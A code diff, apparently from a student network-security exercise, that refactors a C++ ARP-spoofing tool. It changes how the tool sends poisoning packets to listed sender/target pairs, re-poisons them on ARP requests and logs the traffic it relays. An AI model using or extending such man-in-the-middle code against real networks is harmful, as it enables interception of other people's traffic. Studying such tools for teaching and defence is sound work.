@@ -34,7 +34,9 @@ struct EthIpPacket final {
 
 map<Ip, Mac> IpMacMap = map<Ip, Mac>();
 
-Ip key_value_exists(const std::multimap<Ip, Ip>& mmap, Ip key, Ip value) {
+Ip senderTargetExists(const std::multimap<Ip, Ip>& mmap, Ip key, Ip value) {
+	if (mmap.find(key) == mmap.end()) return Ip("127.1.1.1");
+
     auto range = mmap.equal_range(key);
 
     for (auto it = range.first; it != range.second; ++it) if (it->second == value) return value;
@@ -240,10 +242,9 @@ int main(int argc, char* argv[]) {
 	for (int i = 2; i < argc; i += 2) senderTargetMap.insert({Ip(argv[i]), Ip(argv[i + 1])});
 
 	clock_t last_send = clock();
-	for (const auto& [sender, target] : senderTargetMap) {
-		printf("%s %s\n", string(sender).c_str(), string(target).c_str());
+	for (const auto& [sender, target] : senderTargetMap) 
 		send_arp_attack_packet(handle, sender, target, myMac);
-	}
+	
 	
 	printf("Updated the ARP tables of all attack targets\n");
 	
@@ -267,19 +268,12 @@ int main(int argc, char* argv[]) {
 					Ip sender = ntohl(receivedPacket->arp_.sip_);
 					Ip target = ntohl(receivedPacket->arp_.tip_);
 
-					if (senderTargetMap.find(sender) != senderTargetMap.end()) {
-						auto range = senderTargetMap.equal_range(sender);
-						auto lower = range.first;
-						auto upper = range.second;
+					if (senderTargetExists(senderTargetMap, sender, target).isLocalHost()) break;
 
-						for (auto it = lower; it != upper; ++it) {
-							if (it->second == target) {
-								printf("Update Arp Table %s(Req) -> %s(Reply)\n", string(it->first).c_str(), string(it->second).c_str());
-								send_arp_attack_packet(handle, sender, target, myMac);
-								break;
-							}
-						}
-					}
+					printf("Update Arp Table %s(Req) -> %s(Reply)\n", string(sender).c_str(), string(target).c_str());
+					send_arp_attack_packet(handle, sender, target, myMac);
+				
+					
 					// target이 sender에게 보내는 요청의 경우 매개변수로 두가지 방향 모두 입력되기에 sender 목록에 존재함.
 				}
 				break;
@@ -290,7 +284,7 @@ int main(int argc, char* argv[]) {
 					
 					Ip sender = receivedPacketIp->ip_.src_ip(), target = receivedPacketIp->ip_.dst_ip();
 
-					if (!key_value_exists(senderTargetMap, sender, target).isLocalHost()) break;
+					if (senderTargetExists(senderTargetMap, sender, target).isLocalHost()) break;
 					
 					printf("CatchPacket: %s -> %s\n", string(sender).c_str(), string(target).c_str());
 
@@ -304,8 +298,8 @@ int main(int argc, char* argv[]) {
 					} else {
 						printf(
 							"Sent modified packet %s -> %s(%s -> %s)\n", 
-							string(receivedPacketIp->ip_.src_ip_).c_str(), 
-							string(receivedPacketIp->ip_.dst_ip_).c_str(), 
+							string(receivedPacketIp->ip_.src_ip()).c_str(), 
+							string(receivedPacketIp->ip_.dst_ip()).c_str(), 
 							string(receivedPacketIp->eth_.smac_).c_str(), 
 							string(receivedPacketIp->eth_.dmac_).c_str()
 						);
